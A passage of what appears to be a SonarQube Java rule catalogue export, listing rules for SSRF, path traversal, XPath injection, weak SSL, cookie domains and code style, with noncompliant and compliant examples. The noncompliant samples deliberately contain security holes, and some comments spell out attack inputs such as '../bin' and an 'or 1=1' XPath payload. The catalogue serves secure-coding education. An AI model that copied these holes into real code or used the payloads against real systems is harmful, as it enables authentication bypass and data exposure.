  <li> <a href=""https://cwe.mitre.org/data/definitions/918.html"">MITRE, CWE-918</a> - Server-Side Request Forgery (SSRF) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/641.html"">MITRE, CWE-641</a> - Improper Restriction of Names for Files and Other Resources
  </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>",squid:S5144,java,Java,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. A remote server
making requests to URLs based on tainted data could enable attackers to make arbitrary requests to the internal network or to the local file
system.</p>
<p>The problem could be mitigated in any of the following ways:</p>
<ul>
  <li> Validate the user provided data based on a whitelist and reject input not matching. </li>
  <li> Redesign the application to not send requests based on user provided data. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  URL url = new URL(req.getParameter(""url""));
  HttpURLConnection conn = (HttpURLConnection) url.openConnection(); // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  URL url = new URL(req.getParameter(""url""));

  // The safest way is to match the incoming URL against a whitelist
  if (!urlWhiteList.contains(url.toString()))
    throw new IOException();

  // If whitelisting is not possible, at least make sure that things like file:// and http://localhost are blocked
  InetAddress inetAddress = InetAddress.getByName(url.getHost());
  if (!url.getProtocol().startsWith(""http"") ||
      inetAddress.isAnyLocalAddress() ||
      inetAddress.isLoopbackAddress() ||
      inetAddress.isLinkLocalAddress())
    throw new IOException();

  HttpURLConnection conn = (HttpURLConnection) url.openConnection();
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Server_Side_Request_Forgery"">OWASP Attack Category</a> - Server Side Request Forgery </li>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control"">OWASP Top 10 2017</a> - Category A5 - Broken Access Control
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/918.html"">MITRE, CWE-918</a> - Server-Side Request Forgery (SSRF) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/641.html"">MITRE, CWE-641</a> - Improper Restriction of Names for Files and Other Resources
  </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>",Server-side requests should not be vulnerable to forging attacks,[],MAJOR,"['cwe', 'owasp-a5', 'sans-top25-risky']",VULNERABILITY
2018-06-18T12:48:49+0200,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Constructing file
system paths directly from tainted data could enable an attacker to inject specially crafted values, such as <code>'../'</code>, that change the
initial path and, when accessed, resolve to a path on the filesystem where the user should normally not have access.</p>
<p>A successful attack might give an attacker the ability to read, modify, or delete sensitive information from the file system and sometimes even
execute arbitrary operating system commands. This is often referred to as a ""path traversal"" or ""directory traversal"" attack.</p>
<p>The mitigation strategy should be based on the whitelisting of allowed paths or characters.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean authenticate(javax.servlet.http.HttpServletRequest request) {
  String user = request.getParameter(""user"");

  // If the special value ""../bin"" is passed as user, authentication is bypassed
  // Indeed, if it passed as a user, the path becomes:
  // /bin
  // which exists on most Linux / BSD / Mac OS distributions

  return Files.exists(Paths.get(""/home/"", user)); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean authenticate(javax.servlet.http.HttpServletRequest request) {
  String user = request.getParameter(""user"");

  // Restrict the username to letters and digits only
  if (!user.matches(""[a-zA-Z0-9]++"")) {
    return false;
  }

  return Files.exists(Paths.get(""/home/"", user));
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/22"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/23"">MITRE, CWE-23</a> - Relative Path Traversal </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/36"">MITRE, CWE-36</a> - Absolute Path Traversal </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/99"">MITRE, CWE-99</a> - Improper Control of Resource Identifiers ('Resource Injection') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/641.html"">MITRE, CWE-641</a> - Improper Restriction of Names for Files and Other Resources </li>
  <li> OWASP Top 10 2017 Category A5 - Broken Access Control </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>",squid:S2083,java,Java,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Constructing file
system paths directly from tainted data could enable an attacker to inject specially crafted values, such as <code>'../'</code>, that change the
initial path and, when accessed, resolve to a path on the filesystem where the user should normally not have access.</p>
<p>A successful attack might give an attacker the ability to read, modify, or delete sensitive information from the file system and sometimes even
execute arbitrary operating system commands. This is often referred to as a ""path traversal"" or ""directory traversal"" attack.</p>
<p>The mitigation strategy should be based on the whitelisting of allowed paths or characters.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean authenticate(javax.servlet.http.HttpServletRequest request) {
  String user = request.getParameter(""user"");

  // If the special value ""../bin"" is passed as user, authentication is bypassed
  // Indeed, if it passed as a user, the path becomes:
  // /bin
  // which exists on most Linux / BSD / Mac OS distributions

  return Files.exists(Paths.get(""/home/"", user)); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean authenticate(javax.servlet.http.HttpServletRequest request) {
  String user = request.getParameter(""user"");

  // Restrict the username to letters and digits only
  if (!user.matches(""[a-zA-Z0-9]++"")) {
    return false;
  }

  return Files.exists(Paths.get(""/home/"", user));
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/22"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/23"">MITRE, CWE-23</a> - Relative Path Traversal </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/36"">MITRE, CWE-36</a> - Absolute Path Traversal </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/99"">MITRE, CWE-99</a> - Improper Control of Resource Identifiers ('Resource Injection') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/641.html"">MITRE, CWE-641</a> - Improper Restriction of Names for Files and Other Resources </li>
  <li> OWASP Top 10 2017 Category A5 - Broken Access Control </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>",I/O function calls should not be vulnerable to path injection attacks,[],BLOCKER,"['cwe', 'owasp-a5', 'sans-top25-risky']",VULNERABILITY
2018-06-18T12:48:49+0200,"<p>User provided data, such as URL parameters, should always be considered untrusted and tainted. Constructing XPath expressions directly from tainted
data enables attackers to inject specially crafted values that changes the initial meaning of the expression itself. Successful XPath injection
attacks can read sensitive information from XML documents.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean authenticate(javax.servlet.http.HttpServletRequest request, javax.xml.xpath.XPath xpath, org.w3c.dom.Document doc) throws XPathExpressionException {
  String user = request.getParameter(""user"");
  String pass = request.getParameter(""pass"");

  String expression = ""/users/user[@name='"" + user + ""' and @pass='"" + pass + ""']""; // Unsafe

  // An attacker can bypass authentication by setting user to this special value
  user = ""' or 1=1 or ''='"";

  return (boolean)xpath.evaluate(expression, doc, XPathConstants.BOOLEAN); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean authenticate(javax.servlet.http.HttpServletRequest request, javax.xml.xpath.XPath xpath, org.w3c.dom.Document doc) throws XPathExpressionException {
  String user = request.getParameter(""user"");
  String pass = request.getParameter(""pass"");

  String expression = ""/users/user[@name=$user and @pass=$pass]"";

  xpath.setXPathVariableResolver(v -&gt; {
    switch (v.getLocalPart()) {
      case ""user"":
        return user;
      case ""pass"":
        return pass;
      default:
        throw new IllegalArgumentException();
    }
  });

  return (boolean)xpath.evaluate(expression, doc, XPathConstants.BOOLEAN);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/643"">MITRE, CWE-643</a> - Improper Neutralization of Data within XPath Expressions </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/BwLEAw"">CERT, IDS53-J.</a> - Prevent XPath Injection </li>
</ul>",squid:S2091,java,Java,"<p>User provided data, such as URL parameters, should always be considered untrusted and tainted. Constructing XPath expressions directly from tainted
data enables attackers to inject specially crafted values that changes the initial meaning of the expression itself. Successful XPath injection
attacks can read sensitive information from XML documents.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean authenticate(javax.servlet.http.HttpServletRequest request, javax.xml.xpath.XPath xpath, org.w3c.dom.Document doc) throws XPathExpressionException {
  String user = request.getParameter(""user"");
  String pass = request.getParameter(""pass"");

  String expression = ""/users/user[@name='"" + user + ""' and @pass='"" + pass + ""']""; // Unsafe

  // An attacker can bypass authentication by setting user to this special value
  user = ""' or 1=1 or ''='"";

  return (boolean)xpath.evaluate(expression, doc, XPathConstants.BOOLEAN); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean authenticate(javax.servlet.http.HttpServletRequest request, javax.xml.xpath.XPath xpath, org.w3c.dom.Document doc) throws XPathExpressionException {
  String user = request.getParameter(""user"");
  String pass = request.getParameter(""pass"");

  String expression = ""/users/user[@name=$user and @pass=$pass]"";

  xpath.setXPathVariableResolver(v -&gt; {
    switch (v.getLocalPart()) {
      case ""user"":
        return user;
      case ""pass"":
        return pass;
      default:
        throw new IllegalArgumentException();
    }
  });

  return (boolean)xpath.evaluate(expression, doc, XPathConstants.BOOLEAN);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/643"">MITRE, CWE-643</a> - Improper Neutralization of Data within XPath Expressions </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/BwLEAw"">CERT, IDS53-J.</a> - Prevent XPath Injection </li>
</ul>",XPath expressions should not be vulnerable to injection attacks,[],BLOCKER,"['cert', 'cwe', 'owasp-a1']",VULNERABILITY
2014-02-26T13:05:07+0100,"<p>There are two ways to write lambdas that contain single statement, but one is definitely more compact and readable than the other.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
x -&gt; {System.out.println(x+1);}
(a, b) -&gt; { return a+b; }
</pre>
<h2>Compliant Solution</h2>
<pre>
x -&gt; System.out.println(x+1)
(a, b) -&gt; a+b    //For return statement, the return keyword should also be dropped
</pre>",squid:S1602,java,Java,"<p>There are two ways to write lambdas that contain single statement, but one is definitely more compact and readable than the other.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
x -&gt; {System.out.println(x+1);}
(a, b) -&gt; { return a+b; }
</pre>
<h2>Compliant Solution</h2>
<pre>
x -&gt; System.out.println(x+1)
(a, b) -&gt; a+b    //For return statement, the return keyword should also be dropped
</pre>",Lamdbas containing only one statement should not nest this statement in a block,[],MINOR,['java8'],CODE_SMELL
2017-05-05T12:32:52+0200,"<p>If a boolean expression doesn't change the evaluation of the condition, then it is entirely unnecessary, and can be removed. If it is gratuitous
because it does not match the programmer's intent, then it's a bug and the expression should be fixed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = true;
if (a) { // Noncompliant
  doSomething();
}

if (b &amp;&amp; a) { // Noncompliant; ""a"" is always ""true""
  doSomething();
}

if (c || !a) { // Noncompliant; ""!a"" is always ""false""
  doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
a = true;
if (foo(a)) {
  doSomething();
}

if (b) {
  doSomething();
}

if (c) {
  doSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/571"">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/570"">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",squid:S2589,java,Java,"<p>If a boolean expression doesn't change the evaluation of the condition, then it is entirely unnecessary, and can be removed. If it is gratuitous
because it does not match the programmer's intent, then it's a bug and the expression should be fixed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = true;
if (a) { // Noncompliant
  doSomething();
}

if (b &amp;&amp; a) { // Noncompliant; ""a"" is always ""true""
  doSomething();
}

if (c || !a) { // Noncompliant; ""!a"" is always ""false""
  doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
a = true;
if (foo(a)) {
  doSomething();
}

if (b) {
  doSomething();
}

if (c) {
  doSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/571"">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/570"">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",Boolean expressions should not be gratuitous,[],MAJOR,"['cert', 'cwe', 'misra', 'redundant']",CODE_SMELL
2013-08-30T17:20:57+0200,"<p>Utility classes, which are collections of <code>static</code> members, are not meant to be instantiated. Even abstract utility classes, which can
be extended, should not have public constructors.</p>
<p>Java adds an implicit public constructor to every class which does not define at least one explicitly. Hence, at least one non-public constructor
should be defined.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class StringUtils { // Noncompliant

  public static String concatenate(String s1, String s2) {
    return s1 + s2;
  }

}
</pre>
<h2>Compliant Solution</h2>
<pre>
class StringUtils { // Compliant

  private StringUtils() {
    throw new IllegalStateException(""Utility class"");
  }

  public static String concatenate(String s1, String s2) {
    return s1 + s2;
  }

}
</pre>
<h2>Exceptions</h2>
<p>When class contains <code>public static void main(String[] args)</code> method it is not considered as utility class and will be ignored by this
rule.</p>",squid:S1118,java,Java,"<p>Utility classes, which are collections of <code>static</code> members, are not meant to be instantiated. Even abstract utility classes, which can
be extended, should not have public constructors.</p>
<p>Java adds an implicit public constructor to every class which does not define at least one explicitly. Hence, at least one non-public constructor
should be defined.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class StringUtils { // Noncompliant

  public static String concatenate(String s1, String s2) {
    return s1 + s2;
  }

}
</pre>
<h2>Compliant Solution</h2>
<pre>
class StringUtils { // Compliant

  private StringUtils() {
    throw new IllegalStateException(""Utility class"");
  }

  public static String concatenate(String s1, String s2) {
    return s1 + s2;
  }

}
</pre>
<h2>Exceptions</h2>
<p>When class contains <code>public static void main(String[] args)</code> method it is not considered as utility class and will be ignored by this
rule.</p>",Utility classes should not have public constructors,[],MAJOR,['design'],CODE_SMELL
2013-08-30T17:20:57+0200,"<p>The imports part of a file should be handled by the Integrated Development Environment (IDE), not manually by the developer. </p>
<p>Unused and useless imports should not occur if that is the case. </p>
<p>Leaving them in reduces the code's readability, since their presence can be confusing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
package my.company;

import java.lang.String;        // Noncompliant; java.lang classes are always implicitly imported
import my.company.SomeClass;    // Noncompliant; same-package files are always implicitly imported
import java.io.File;            // Noncompliant; File is not used

import my.company2.SomeType;
import my.company2.SomeType;    // Noncompliant; 'SomeType' is already imported

class ExampleClass {

  public String someString;
  public SomeType something;

}
</pre>
<h2>Exceptions</h2>
<p>Imports for types mentioned in comments, such as Javadocs, are ignored.</p>",squid:UselessImportCheck,java,Java,"<p>The imports part of a file should be handled by the Integrated Development Environment (IDE), not manually by the developer. </p>
<p>Unused and useless imports should not occur if that is the case. </p>
<p>Leaving them in reduces the code's readability, since their presence can be confusing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
package my.company;

import java.lang.String;        // Noncompliant; java.lang classes are always implicitly imported
import my.company.SomeClass;    // Noncompliant; same-package files are always implicitly imported
import java.io.File;            // Noncompliant; File is not used

import my.company2.SomeType;
import my.company2.SomeType;    // Noncompliant; 'SomeType' is already imported

class ExampleClass {

  public String someString;
  public SomeType something;

}
</pre>
<h2>Exceptions</h2>
<p>Imports for types mentioned in comments, such as Javadocs, are ignored.</p>",Unnecessary imports should be removed,[],MINOR,['unused'],CODE_SMELL
2013-08-30T17:20:57+0200,"<p>Return of boolean literal statements wrapped into <code>if-then-else</code> ones should be simplified.</p>
<p>Similarly, method invocations wrapped into <code>if-then-else</code> differing only from boolean literals should be simplified into a single
invocation.</p>
<h2>Noncompliant Code Example</h2>
<pre>
boolean foo(Object param) {
  if (expression) { // Noncompliant
    bar(param, true, ""qix"");
  } else {
    bar(param, false, ""qix"");
  }

  if (expression) {  // Noncompliant
    return true;
  } else {
    return false;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
boolean foo(Object param) {
  bar(param, expression, ""qix"");

  return expression;
}
</pre>",squid:S1126,java,Java,"<p>Return of boolean literal statements wrapped into <code>if-then-else</code> ones should be simplified.</p>
<p>Similarly, method invocations wrapped into <code>if-then-else</code> differing only from boolean literals should be simplified into a single
invocation.</p>
<h2>Noncompliant Code Example</h2>
<pre>
boolean foo(Object param) {
  if (expression) { // Noncompliant
    bar(param, true, ""qix"");
  } else {
    bar(param, false, ""qix"");
  }

  if (expression) {  // Noncompliant
    return true;
  } else {
    return false;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
boolean foo(Object param) {
  bar(param, expression, ""qix"");

  return expression;
}
</pre>","Return of boolean expressions should not be wrapped into an ""if-then-else"" statement",[],MINOR,['clumsy'],CODE_SMELL
2015-06-04T13:56:30+0200,"<p>A test case without assertions ensures only that no exceptions are thrown. Beyond basic runnability, it ensures nothing about the behavior of the
code under test.</p>
<p>This rule raises an exception when no assertions from any of the following known frameworks are found in a test:</p>
<ul>
  <li> JUnit </li>
  <li> Fest 1.x </li>
  <li> Fest 2.x </li>
  <li> Rest-assured 2.0 </li>
  <li> AssertJ </li>
  <li> Hamcrest </li>
  <li> Spring's <code>org.springframework.test.web.servlet.ResultActions.andExpect()</code> </li>
  <li> Eclipse Vert.x </li>
  <li> Truth Framework </li>
  <li> Mockito </li>
  <li> EasyMock </li>
  <li> JMock </li>
  <li> WireMock </li>
  <li> RxJava 1.x </li>
  <li> RxJava 2.x </li>
  <li> Selenide </li>
  <li> JMockit </li>
</ul>
<p>Furthermore, as new or custom assertion frameworks may be used, the rule can be parametrized to define specific methods that will also be
considered as assertions. No issue will be raised when such methods are found in test cases. The parameter value should have the following format
<code>&lt;FullyQualifiedClassName&gt;#&lt;MethodName&gt;</code>, where <code>MethodName</code> can end with the wildcard character. For constructors,
the pattern should be <code>&lt;FullyQualifiedClassName&gt;#&lt;init&gt;</code>.</p>
<p>Example:&nbsp;<code>com.company.CompareToTester#compare*,com.company.CustomAssert#customAssertMethod,com.company.CheckVerifier#&lt;init&gt;</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Test
public void testDoSomething() {  // Noncompliant
  MyClass myClass = new MyClass();
  myClass.doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<p>Example when <code>com.company.CompareToTester#compare*</code> is used as parameter to the rule.</p>
<pre>
import com.company.CompareToTester;

@Test
public void testDoSomething() {
  MyClass myClass = new MyClass();
  assertNull(myClass.doSomething());  // JUnit assertion
  assertThat(myClass.doSomething()).isNull();  // Fest assertion
}

@Test
public void testDoSomethingElse() {
  MyClass myClass = new MyClass();
  new CompareToTester().compareWith(myClass);  // Compliant - custom assertion method defined as rule parameter
  CompareToTester.compareStatic(myClass);  // Compliant
}
</pre>",squid:S2699,java,Java,"<p>A test case without assertions ensures only that no exceptions are thrown. Beyond basic runnability, it ensures nothing about the behavior of the
code under test.</p>
<p>This rule raises an exception when no assertions from any of the following known frameworks are found in a test:</p>
<ul>
  <li> JUnit </li>
  <li> Fest 1.x </li>
  <li> Fest 2.x </li>
  <li> Rest-assured 2.0 </li>
  <li> AssertJ </li>
  <li> Hamcrest </li>
  <li> Spring's <code>org.springframework.test.web.servlet.ResultActions.andExpect()</code> </li>
  <li> Eclipse Vert.x </li>
  <li> Truth Framework </li>
  <li> Mockito </li>
  <li> EasyMock </li>
  <li> JMock </li>
  <li> WireMock </li>
  <li> RxJava 1.x </li>
  <li> RxJava 2.x </li>
  <li> Selenide </li>
  <li> JMockit </li>
</ul>
<p>Furthermore, as new or custom assertion frameworks may be used, the rule can be parametrized to define specific methods that will also be
considered as assertions. No issue will be raised when such methods are found in test cases. The parameter value should have the following format
<code>&lt;FullyQualifiedClassName&gt;#&lt;MethodName&gt;</code>, where <code>MethodName</code> can end with the wildcard character. For constructors,
the pattern should be <code>&lt;FullyQualifiedClassName&gt;#&lt;init&gt;</code>.</p>
<p>Example:&nbsp;<code>com.company.CompareToTester#compare*,com.company.CustomAssert#customAssertMethod,com.company.CheckVerifier#&lt;init&gt;</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Test
public void testDoSomething() {  // Noncompliant
  MyClass myClass = new MyClass();
  myClass.doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<p>Example when <code>com.company.CompareToTester#compare*</code> is used as parameter to the rule.</p>
<pre>
import com.company.CompareToTester;

@Test
public void testDoSomething() {
  MyClass myClass = new MyClass();
  assertNull(myClass.doSomething());  // JUnit assertion
  assertThat(myClass.doSomething()).isNull();  // Fest assertion
}

@Test
public void testDoSomethingElse() {
  MyClass myClass = new MyClass();
  new CompareToTester().compareWith(myClass);  // Compliant - custom assertion method defined as rule parameter
  CompareToTester.compareStatic(myClass);  // Compliant
}
</pre>",Tests should include assertions,"[{'key': 'customAssertionMethods', 'htmlDesc': 'Comma-separated list of fully qualified method symbols that should be considered as assertion methods. The wildcard character can be used at the end of the method name.', 'type': 'STRING'}]",BLOCKER,['tests'],CODE_SMELL
2018-04-24T12:32:59+0200,"<p><code>javax.net.ssl.SSLContext.getInstance</code> returns a SSLContext object that implements the specified secure socket protocol. However, not
all protocols are created equal and some legacy ones like ""SSL"", have been proven to be insecure.</p>
<p>This rule raises an issue when an <code>SSLContext</code> is created with an insecure protocol (ie: a protocol different from ""TLS"", ""DTLS"",
""TLSv1.2"", ""DTLSv1.2"", ""TLSv1.3"", ""DTLSv1.3"").</p>
<p>The recommended value is ""TLS"" or ""DTLS"" as it will always use the latest version of the protocol. However an issue will be raised if the bytecode
was compiled with JDK7 or an even older version of JDK because they are not alias for TLSv1.2 and DTLSv1.2 but for weaker protocols.</p>
<p>Note that calling <code>SSLContext.getInstance(...)</code> with ""TLSv1.2"" or ""DTLSv1.2"" doesn't prevent protocol version negotiation. For example,
if a client connects with ""TLSv1.1"" and the server used <code>SSLContext.getInstance(""TLSv1.2"")</code>, the connection will use ""TLSv1.1"". It is
possible to enable only specific protocol versions by calling <code>setEnabledProtocols</code> on <code>SSLSocket</code>, <code>SSLServerSocket</code>
or <code>SSLEngine</code>. However this should be rarely needed as clients usually ask for the most secure protocol supported.</p>
<h2>Noncompliant Code Example</h2>
<pre>
context = SSLContext.getInstance(""SSL""); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
context = SSLContext.getInstance(""TLSv1.2"");
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/326.html"">MITRE, CWE-327</a> - Inadequate Encryption Strength </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/327.html"">MITRE, CWE-326</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href=""https://blogs.oracle.com/java-platform-group/diagnosing-tls,-ssl,-and-https"">Diagnosing TLS, SSL, and HTTPS</a> </li>
</ul>",squid:S4423,java,Java,"<p><code>javax.net.ssl.SSLContext.getInstance</code> returns a SSLContext object that implements the specified secure socket protocol. However, not
all protocols are created equal and some legacy ones like ""SSL"", have been proven to be insecure.</p>
<p>This rule raises an issue when an <code>SSLContext</code> is created with an insecure protocol (ie: a protocol different from ""TLS"", ""DTLS"",
""TLSv1.2"", ""DTLSv1.2"", ""TLSv1.3"", ""DTLSv1.3"").</p>
<p>The recommended value is ""TLS"" or ""DTLS"" as it will always use the latest version of the protocol. However an issue will be raised if the bytecode
was compiled with JDK7 or an even older version of JDK because they are not alias for TLSv1.2 and DTLSv1.2 but for weaker protocols.</p>
<p>Note that calling <code>SSLContext.getInstance(...)</code> with ""TLSv1.2"" or ""DTLSv1.2"" doesn't prevent protocol version negotiation. For example,
if a client connects with ""TLSv1.1"" and the server used <code>SSLContext.getInstance(""TLSv1.2"")</code>, the connection will use ""TLSv1.1"". It is
possible to enable only specific protocol versions by calling <code>setEnabledProtocols</code> on <code>SSLSocket</code>, <code>SSLServerSocket</code>
or <code>SSLEngine</code>. However this should be rarely needed as clients usually ask for the most secure protocol supported.</p>
<h2>Noncompliant Code Example</h2>
<pre>
context = SSLContext.getInstance(""SSL""); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
context = SSLContext.getInstance(""TLSv1.2"");
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/326.html"">MITRE, CWE-327</a> - Inadequate Encryption Strength </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/327.html"">MITRE, CWE-326</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href=""https://blogs.oracle.com/java-platform-group/diagnosing-tls,-ssl,-and-https"">Diagnosing TLS, SSL, and HTTPS</a> </li>
</ul>",Weak SSL protocols should not be used,[],MAJOR,"['cwe', 'owasp-a3', 'owasp-a6', 'sans-top25-porous']",VULNERABILITY
2019-02-20T08:56:37+0100,"<p>A cookie's domain specifies which websites should be able to read it. Left blank, browsers are supposed to only send the cookie to sites that
exactly match the sending domain. For example, if a cookie was set by <em>lovely.dream.com</em>, it should only be readable by that domain, and not by
<em>nightmare.com</em> or even <em>strange.dream.com</em>. If you want to allow sub-domain access for a cookie, you can specify it by adding a dot in
front of the cookie's domain, like so: <em>.dream.com</em>. But cookie domains should always use at least two levels.</p>
<p>Cookie domains can be set either programmatically or via configuration. This rule raises an issue when any cookie domain is set with a single
level, as in <em>.com</em>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Cookie myCookie = new Cookie(""name"", ""val"");
myCookie.setDomain("".com""); // Noncompliant
java.net.HttpCookie myOtherCookie = new java.net.HttpCookie(""name"", ""val"");
myOtherCookie.setDomain("".com""); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Cookie myCookie = new Cookie(""name"", ""val""); // Compliant; by default, cookies are only returned to the server that sent them.

// or

Cookie myCookie = new Cookie(""name"", ""val"");
myCookie.setDomain("".myDomain.com""); // Compliant

java.net.HttpCookie myOtherCookie = new java.net.HttpCookie(""name"", ""val"");
myOtherCookie.setDomain("".myDomain.com""); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
</ul>",squid:S3331,java,Java,"<p>A cookie's domain specifies which websites should be able to read it. Left blank, browsers are supposed to only send the cookie to sites that
exactly match the sending domain. For example, if a cookie was set by <em>lovely.dream.com</em>, it should only be readable by that domain, and not by
<em>nightmare.com</em> or even <em>strange.dream.com</em>. If you want to allow sub-domain access for a cookie, you can specify it by adding a dot in
front of the cookie's domain, like so: <em>.dream.com</em>. But cookie domains should always use at least two levels.</p>
<p>Cookie domains can be set either programmatically or via configuration. This rule raises an issue when any cookie domain is set with a single
level, as in <em>.com</em>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Cookie myCookie = new Cookie(""name"", ""val"");
myCookie.setDomain("".com""); // Noncompliant
java.net.HttpCookie myOtherCookie = new java.net.HttpCookie(""name"", ""val"");
myOtherCookie.setDomain("".com""); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Cookie myCookie = new Cookie(""name"", ""val""); // Compliant; by default, cookies are only returned to the server that sent them.

// or

Cookie myCookie = new Cookie(""name"", ""val"");
myCookie.setDomain("".myDomain.com""); // Compliant

java.net.HttpCookie myOtherCookie = new java.net.HttpCookie(""name"", ""val"");
myOtherCookie.setDomain("".myDomain.com""); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
</ul>",Cookie domains should be as narrow as possible,[],CRITICAL,['owasp-a7'],SECURITY_HOTSPOT
